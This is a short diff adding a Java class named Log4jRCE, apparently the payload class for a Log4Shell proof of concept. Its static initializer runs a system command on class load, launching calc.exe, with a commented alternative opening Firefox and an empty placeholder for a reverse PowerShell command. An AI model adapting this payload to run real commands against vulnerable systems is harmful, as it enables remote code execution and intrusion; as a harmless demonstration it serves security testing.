@@ -1,0 +1,12 @@
+public class Log4jRCE {
+    static {
+        try {
+           String fireCmd = "firefox --new-window youtube.com/@Justin-Garey"; //Ubuntu
+           String calcCmd = "calc.exe";  //Windows
+           String revPowershell = "";
+           Runtime.getRuntime().exec(calcCmd).waitFor();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
